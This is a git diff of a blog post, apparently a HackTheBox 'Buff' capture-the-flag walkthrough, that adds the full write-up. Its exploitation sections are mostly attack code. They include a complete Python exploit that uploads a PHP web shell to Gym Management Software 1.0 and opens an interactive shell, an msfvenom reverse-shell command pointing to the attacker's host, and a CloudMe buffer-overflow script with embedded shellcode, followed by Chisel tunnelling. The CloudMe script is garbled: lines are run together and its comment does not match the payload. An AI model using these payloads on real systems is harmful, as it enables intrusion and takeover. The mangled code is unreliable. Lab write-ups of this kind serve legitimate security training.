@@ -1,15 +1,306 @@
 ---
 layout: walkthrough
 title: HackTheBox - Buff
-date: 2000-09-11 12:00:00 +0200
+date: 2020-11-22 12:00:00 +0200
 img: ChallengeVMs/HTB_Icons/buff.png # Add image post (optional)
-status: Active
+status: Retired
 description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
 ---
 
+Hi everyone, today we are going to be looking at Buff --`10.10.10.198`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:
 
-## Current Status - Active
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Buff/Overview.png"  style="width: 65%" />
+</p>
 
-This walkthrough will be released once the machine has retired on HackTheBox. If you want to get any hints or if you want to chat about the machine, feel free to reach out to me and I will help you as much as I can!
+## Information Gathering
 
-<img src="/assets/img/comingsoon.png" alt="Coming Soon">
+In order to start the VM, we start with the Information gathering phase. Let's begin with a Rust Scan.
+
+### Rust Output
+
+<details>
+
+```bat
+vagrant@ko:~/Desktop/HackTheBox/Buff$ rustscan 10.10.10.198 --ulimit 5000
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+Faster Nmap scanning with Rust.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
+
+[~] The config file is expected to be at "/home/vagrant/.config/rustscan/config.toml"
+[~] Automatically increasing ulimit value to 5000.
+Open 10.10.10.198:8080
+Open 10.10.10.198:7680
+fi[~] Starting Nmap
+[>] The Nmap command to be run is nmap -vvv -p 8080,7680 10.10.10.198
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 10:23 EDT
+Initiating Ping Scan at 10:23
+Scanning 10.10.10.198 [2 ports]
+Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
+Ping Scan Timing: About 50.00% done; ETC: 10:23 (0:00:01 remaining)
+Completed Ping Scan at 10:23, 3.02s elapsed (1 total hosts)
+Nmap scan report for 10.10.10.198 [host down, received no-response]
+Read data files from: /usr/bin/../share/nmap
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 3.13 seconds
+
+```
+
+</details>
+
+### Nmap Output
+
+From there, I decided to do an additional Nmap scan to gather additional information about the open ports. The output of which is provided below:
+
+<details>
+
+```
+vagrant@ko:~/Desktop/HackTheBox$ sudo nmap 10.10.10.198 -p 7680,8080 -sC -sV -Pn
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 10:27 EDT
+Nmap scan report for 10.10.10.198
+Host is up (0.18s latency).
+
+PORT     STATE SERVICE    VERSION
+7680/tcp open  pando-pub?
+8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+|_http-title: mrb3n's Bro Hut
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 91.36 seconds
+
+```
+</details>
+
+From the output shown above, we can see that the machine is a Windows machine based on the information provided from the `http-server-header`, and I added `buff.htb` to the `/etc/hosts` file. As this is a Windows machine and it only has 2 open ports, I'm going to assume that we need to start by looking at the web application. When browsing to <http://buff.htb:8080> we were presented with the following web page:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Buff/img1.png"  style="width: 100%" />
+</p>
+
+### Basic Web Enumeration
+While browsing the web application, I came across the following:
+* <http://10.10.10.198:8080/contact.php> -- This link informed us that the application made use of `Gym Management Software 1.0`
+
+Having a look for exploits based on the software version, the following Exploit DB link seemed interesting: <exploit-db.com/exploits/48506>. Looking at the exploit requirements, it seemed like we needed access to the `upload.php` page:
+
+> Access the '/upload.php' page, as it does not check for an authenticated user session.
+
+Navigating to that URL produced the error message shown below, so it looked like we were on the right track.
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Buff/img2.png"  style="width: 100%" />
+</p>
+
+
+In order to get the exploit working on my machine, I needed to convert it to Python3. The updated version of the exploit script is provided below:
+
+<details>
+
+```python
+import requests, sys, urllib, re
+from colorama import Fore, Back, Style
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+def webshell(SERVER_URL, session):
+    try:
+        WEB_SHELL = SERVER_URL+'upload/kamehameha.php'
+        getdir  = {'telepathy': 'echo %CD%'}
+        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
+        status = r2.status_code
+        if status != 200:
+            print(Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL)
+            r2.raise_for_status()
+        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
+        cwd = re.findall('[CDEF].*', r2.text)
+        cwd = cwd[0]+"> "
+        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
+        while True:
+            thought = input(term)
+            command = {'telepathy': thought}
+            r2 = requests.get(WEB_SHELL, params=command, verify=False)
+            status = r2.status_code
+            if status != 200:
+                r2.raise_for_status()
+            response2 = r2.text
+            print(response2)
+    except Exception as e:
+        print("\r\nExiting. Reason - " + str(e))
+        sys.exit(-1)
+
+def formatHelp(STRING):
+    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET
+
+def header():
+    BL   = Style.BRIGHT+Fore.GREEN
+    RS   = Style.RESET_ALL
+    FR   = Fore.RESET
+    SIG  = BL+'            /\\\n'+RS
+    SIG += Fore.YELLOW+'/vvvvvvvvvvvv '+BL+'\\'+FR+'--------------------------------------,\n'
+    SIG += Fore.YELLOW+'`^^^^^^^^^^^^'+BL+' /'+FR+'============'+Fore.RED+'BOKU'+FR+'====================="\n'
+    SIG += BL+'            \/'+RS+'\n'
+    return SIG
+
+if __name__ == "__main__":
+    print(header());
+    if len(sys.argv) != 2:
+        print(formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0]))
+        print(formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0]))
+        sys.exit(-1)
+    SERVER_URL = sys.argv[1]
+    UPLOAD_DIR = 'upload.php?id=kamehameha'
+    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
+    s = requests.Session()
+    s.get(SERVER_URL, verify=False)
+    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
+    png     = {
+                'file': 
+                  (
+                    'kaio-ken.php.png', 
+                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>', 
+                    'image/png', 
+                    {'Content-Disposition': 'form-data'}
+                  ) 
+              }
+    fdata   = {'pupload': 'upload'}
+    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
+    webshell(SERVER_URL, s)
+
+```
+</details>
+
+
+## Gym Software Exploitation
+
+Once the code had been updated, I ran it using the following command:
+
+```bat
+python buff_exploit.py http://10.10.10.198:8080
+```
+
+As shown below, the exploit was successful and we connected to the machine as the `Shaun` user:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Buff/img3.png"  style="width: 75%" />
+</p>
+
+## Privilege Escalation using Shaun
+
+After performing some basic enumeration, I uploaded WinPEAS to the web server. Although WinPEAS contained a lot of information, the following service looked interesting:
+
+```bat
+CloudMe_1112(4376)[C:\Users\shaun\Downloads\CloudMe_1112.exe] -- POwn: shaun
+Permissions: shaun [AllAccess]
+Possible DLL Hijacking folder: C:\Users\shaun\Downloads (shaun [AllAccess])
+Command Line: CloudMe_1112.exe
+
+```
+
+I decided to look into CloudMe, which turned out to be a file storage service operated by CloudMe AB that offers cloud storage, file synchronization and client software. After a quick Google search, I realised that there was a Buffer Overflow associated with this specific version: <https://www.exploit-db.com/exploits/48389>.
+
+> CloudMe Sync is a synchronization application which sync your local  storage with the cloud storage, and it is listening on port 8888.
+
+
+### Exploiting CloudMe
+
+The one issue I had with this box is that the service wasn't always running. I had to restart the machine several times in order to ensure the service was running, to verify that it was available, I issued the following netstat command:
+
+```
+netstat -ano | findstr 8888
+```
+
+Once I was happy that the service was running, I needed to create a reverse shell which would be used within the exploit provided above. In order to create a reverse shell, I used the following MSFVenom command:
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.147 LPORT=9876 -f python
+```
+
+After the reverse shell python code was generated, I included it within the exploit script which now resembled the following:
+
+<details>
+
+```python
+# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)# Date: 2020-04-27# Exploit Author: Andy Bowden# Vendor Homepage: https://www.cloudme.com/en# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe# Version: CloudMe 1.11.2# Tested on: Windows 10 x86
+#Instructions:# Start the CloudMe service and run the script.
+import socket
+target = "127.0.0.1"
+padding1   = b"\x90" * 1052EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RETNOPS       = b"\x90" * 30
+#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
+buf =  b""buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
+buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
+buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
+buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
+buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
+buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
+buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
+buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
+buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
+buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
+buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
+buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
+buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
+buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
+buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\x93\x68"
+buf += b"\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
+buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
+buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
+buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
+buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
+buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
+buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
+buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
+buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
+buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
+
+overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + buf))   
+payload = padding1 + EIP + NOPS + buf + overrun 
+try:    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((target,8888))    s.send(payload)except Exception as e:    print(sys.exc_value)
+
+```
+</details>
+
+
+Since it's a python exploit, I needed to do port forwarding and run it from our own host. [Chisel](https://github.com/jpillora/chisel.git) is a great tool for this -- Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.
+
+In order to complete the exploit, I needed to do the following:
+
+#### On the Kali machine:
+
+```bat
+vagrant@ko:/opt/chisel$ ./chisel server -p 8080 --reverse
+2020/09/11 09:09:17 server: Reverse tunnelling enabled
+2020/09/11 09:09:17 server: Fingerprint e4:fa:3f:c1:be:b1:b0:1d:a2:dc:8c:91:91:20:3d:ef
+2020/09/11 09:09:17 server: Listening on http://0.0.0.0:8080
+
+
+2020/09/11 09:15:39 server: session#1: tun: proxy#R:8888=>8888: Listening
+```
+
+
+#### On the Windows Machine:
+
+```
+C:\xampp\htdocs\gym\upload>chisel-x64.exe client 10.10.14.147:8080 R:8888:127.0.0.1:8888
+chisel-x64.exe client 10.10.14.147:8080 R:8888:127.0.0.1:8888
+2020/09/11 14:21:49 client: Connecting to ws://10.10.14.147:8080
+2020/09/11 14:21:50 client: Fingerprint e4:fa:3f:c1:be:b1:b0:1d:a2:dc:8c:91:91:20:3d:ef
+2020/09/11 14:21:51 client: Connected (Latency 257.7596ms)
+```
+
+Running the exploit provided us with an Administrative shell, the output of which is shown in the screenshot below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Buff/img4.png"  style="width: 75%" />
+</p>
+
+That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
